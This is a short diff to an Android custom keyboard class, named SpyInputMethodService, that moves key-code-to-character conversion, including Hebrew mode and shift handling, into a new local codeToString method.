@@ -136,7 +136,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
     }
 
     private void charAction(int primaryCode, InputConnection ic) {
-        String typed = dictionary.codeToString(primaryCode, hebrewMode, caps);
+        String typed = codeToString(primaryCode);
         ic.commitText(typed, 1); //writing to screen
 
         if (keyboardView.isShifted())
@@ -162,6 +162,27 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         }
     }
 
+
+    /**
+     * Converts a given primary code to the string of its meaning
+     * @param primaryCode Code of pressed key/s
+     * @return the String value of the primarycode given
+     */
+    public String codeToString(int primaryCode) {
+        char finalCode;
+        if (primaryCode == ' ')
+            finalCode = ' ';
+        else {
+            if (hebrewMode) {
+                finalCode = dictionary.engToHeb(primaryCode);
+            } else {
+                primaryCode = caps && !symbol ? primaryCode + ('A' - 'a') : primaryCode; // converting to upper case when shift
+                finalCode = (char) primaryCode; // converting to char
+            }
+        }
+
+        return String.valueOf(finalCode);
+    }
 
     /**
      * This method will use the pointer of the keyboard
